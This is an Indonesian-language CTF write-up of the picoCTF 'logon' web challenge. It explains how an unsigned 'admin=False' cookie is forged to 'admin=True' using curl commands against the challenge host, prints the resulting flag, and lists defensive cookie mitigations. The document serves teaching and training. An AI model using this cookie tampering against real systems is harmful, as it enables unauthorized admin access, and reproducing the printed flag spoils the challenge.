# Writeup: logon (Challenge ID: 46)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Cookie Tampering & Broken Access Control
- **Difficulty:** Easy
- **Author:** bobson
- **Event:** picoCTF 2019
- **Points:** 100
- **Flag:** `academy{th3_c0nsp1r4cy_l1v3s_f77a0420}`

---

## Problem Statement & Scope
Disediakan sebuah aplikasi web sistem masuk pabrik ("Factory Login"). Aplikasi membatasi akses ke data rahasia dan menolak upaya masuk pengguna reguler seperti `Joe`. Peserta ditugaskan menemukan cara mendapatkan hak istimewa administrator dan melihat flag yang disembunyikan.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Client-Side Controlled Session State:** Aplikasi menggunakan cookie HTTP yang tidak bertanda tangan (*unsigned plaintext cookies*) untuk menentukan status otorisasi pengguna (`admin=False`).
2. **Ketiadaan Integritas Kriptografis pada Cookie:** Karena nilai cookie dikirimkan dalam format teks biasa tanpa HMAC signature (seperti Flask signed cookies yang valid) atau token sesi sisi server (server-side session storage), klien dapat secara bebas memodifikasi parameter `admin` menjadi `True` (*Parameter Tampering*).
3. **Broken Object Level Authorization (BOLA / IDOR):** Endpoint `/flag` hanya membaca header HTTP request `Cookie: admin=True` tanpa memeriksa apakah sesi tersebut benar-benar diotentikasi oleh administrator pada basis data server.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Coba lakukan login dengan akun sembarang, misalnya `user=alice&password=123`:
   ```bash
   curl -i -d "user=alice&password=123" http://chatelaine.cylabacademy.net:39681/login
   ```
2. Analisis header respons server:
   ```http
   HTTP/1.1 302 FOUND
   Location: /flag
   Set-Cookie: password=123; Path=/
   Set-Cookie: username=alice; Path=/
   Set-Cookie: admin=False; Path=/
   ```
   Server secara eksplisit memberikan cookie `admin=False`.
3. Manipulasi cookie request saat mengakses endpoint `/flag` dengan menetapkan `admin=True`:
   ```bash
   curl -s -b "admin=True; username=Joe" http://chatelaine.cylabacademy.net:39681/flag
   ```
4. Server merender tampilan halaman administratif yang memuat token rahasia:
   ```html
   <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>academy{th3_c0nsp1r4cy_l1v3s_f77a0420}</code></p>
   ```

---

## Flag & Verifikasi
- **Flag:** `academy{th3_c0nsp1r4cy_l1v3s_f77a0420}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan respons `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Integritas Cookie Sesi:** Jangan pernah menyimpan status otorisasi boolean (`is_admin`, `role`, `admin`) di dalam cookie klien tanpa enkripsi atau tanda tangan digital (HMAC-SHA256).
- **Penggunaan Session ID Terpusat:** Simpan data peran pengguna di basis data atau cache server (Redis/Memcached) dan hanya berikan string ID sesi acak dengan entropi tinggi (`session_id`) kepada browser klien.
- **Konfigurasi Flag Keamanan Cookie:** Tambahkan atribut `HttpOnly` (mencegah XSS membaca cookie), `Secure` (hanya dikirim melalui HTTPS), dan `SameSite=Strict` (mencegah serangan CSRF).
